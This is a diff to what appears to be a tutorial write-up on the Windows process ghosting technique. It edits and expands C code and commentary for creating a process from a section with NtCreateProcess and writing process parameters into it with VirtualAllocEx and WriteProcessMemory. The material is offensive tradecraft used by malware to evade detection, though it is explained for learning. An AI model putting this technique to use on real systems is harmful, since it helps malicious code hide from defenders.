@@ -267,14 +267,10 @@ PCP_INFO create_cp(HANDLE hsection) {
 	CP_INFO * p_info = (PCP_INFO)malloc(sizeof(CP_INFO));
 	RtlZeroMemory(p_info, sizeof(CP_INFO));
 
-	NTSTATUS _status = NtCreateProcess(&(p_info->p_handle), PROCESS_ALL_ACCESS, NULL, GetCurrentProcess(), TRUE, hsection, NULL, NULL);
-
-	_status = NtQueryInformationProcess(p_info->p_handle, ProcessBasicInformation, &(p_info->pb_info), sizeof(PROCESS_BASIC_INFORMATION), NULL);
-
+	NtCreateProcess(&(p_info->p_handle), PROCESS_ALL_ACCESS, NULL, GetCurrentProcess(), TRUE, hsection, NULL, NULL);
+	NtQueryInformationProcess(p_info->p_handle, ProcessBasicInformation, &(p_info->pb_info), sizeof(PROCESS_BASIC_INFORMATION), NULL);
 	printf("> Process ID: %d\n", GetProcessId(p_info->p_handle));
-
-return p_info;
-
+	return p_info;
 }
 ```
 
@@ -282,8 +278,8 @@ Here, we create a process using the [NtCreateProcess()](http://undocumented.ntin
 
 ```c
 typedef struct _CP_INFO {
-	HANDLE p_handle;
-	PROCESS_BASIC_INFORMATION pb_info;
+    HANDLE p_handle;
+    PROCESS_BASIC_INFORMATION pb_info;
 } CP_INFO, * PCP_INFO;
 ```
 
@@ -352,46 +348,39 @@ LPVOID write_params(HANDLE hprocess, PRTL_USER_PROCESS_PARAMETERS proc_params) {
 	ULONG_PTR env_end = NULL;
 	ULONG_PTR buffer_end = (ULONG_PTR)proc_params + proc_params->Length;
 	SIZE_T buffer_size;
-	
-	// Check for environment variables
-	
+
 	if (proc_params->Environment) {
 		if ((ULONG_PTR)proc_params > (ULONG_PTR)proc_params->Environment) {
 			buffer = (PVOID)proc_params->Environment;
 		}
-	
+
 		env_end = (ULONG_PTR)proc_params->Environment + proc_params->EnvironmentSize;
-		
+
 		if (env_end > buffer_end) {
-		buffer_end = env_end;
+			buffer_end = env_end;
 		}
 	}
-	
-	// Calculate buffer size
+
 	buffer_size = buffer_end - (ULONG_PTR)buffer;
-	
+
 	if (VirtualAllocEx(hprocess, buffer, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
-		WriteProcessMemory(hprocess, (LPVOID)proc_params, (LPVOID)proc_params, proc_params->Length, NULL)
-		
+		WriteProcessMemory(hprocess, (LPVOID)proc_params, (LPVOID)proc_params, proc_params->Length, NULL);
 		if (proc_params->Environment) {
 			WriteProcessMemory(hprocess, (LPVOID)proc_params->Environment, (LPVOID)proc_params->Environment, proc_params->EnvironmentSize, NULL);
 		}
 		return (LPVOID)proc_params;
-	
 	}
-	
-	
-	VirtualAllocEx(hprocess, (LPVOID)proc_params, proc_params->Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
-	
+
+	VirtualAllocEx(hprocess, (LPVOID)proc_params, proc_params->Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	WriteProcessMemory(hprocess, (LPVOID)proc_params, (LPVOID)proc_params, proc_params->Length, NULL);
 	
 	if (proc_params->Environment) {
 		VirtualAllocEx(hprocess, (LPVOID)proc_params->Environment, proc_params->EnvironmentSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-		WriteProcessMemory(hprocess, (LPVOID)proc_params->Environment, (LPVOID)proc_params->Environment, proc_params->EnvironmentSize, NULL)
+
+		WriteProcessMemory(hprocess, (LPVOID)proc_params->Environment, (LPVOID)proc_params->Environment, proc_params->EnvironmentSize, NULL);
 	}
 	
 	return (LPVOID)proc_params;
-
 }
 ```
 
@@ -435,7 +424,38 @@ typedef struct _RTL_USER_PROCESS_PARAMETERS {
 } RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;
 ```
 
-Now, back to dealing with the memory locations. 
+Now, back to dealing with the memory locations. For the first case we calculate the total size of the memory region that we need to allocate, in order to write both the Process Parameters and the Environment block:
+
+```c
+PVOID buffer = proc_params;
+ULONG_PTR env_end = NULL;
+ULONG_PTR buffer_end = (ULONG_PTR)proc_params + proc_params->Length;
+SIZE_T buffer_size;
+	
+if (proc_params->Environment) {
+	if ((ULONG_PTR)proc_params > (ULONG_PTR)proc_params->Environment) {
+		buffer = (PVOID)proc_params->Environment;
+	}
+	
+	env_end = (ULONG_PTR)proc_params->Environment + proc_params->EnvironmentSize;	
+	if (env_end > buffer_end) {
+		buffer_end = env_end;
+	}
+}
+```
+
+With that out of the way, we can allocate memory equal to the size of the region and use [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) function to write to the child process memory:
+```c
+if (VirtualAllocEx(hprocess, buffer, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
+	WriteProcessMemory(hprocess, (LPVOID)proc_params, (LPVOID)proc_params, proc_params->Length, NULL);
+	if (proc_params->Environment) {
+		WriteProcessMemory(hprocess, (LPVOID)proc_params->Environment, (LPVOID)proc_params->Environment, proc_params->EnvironmentSize, NULL);
+	}
+	return (LPVOID)proc_params;
+}
+```
+
+
 
 ## References
 - https://www.elastic.co/blog/process-ghosting-a-new-executable-image-tampering-attack
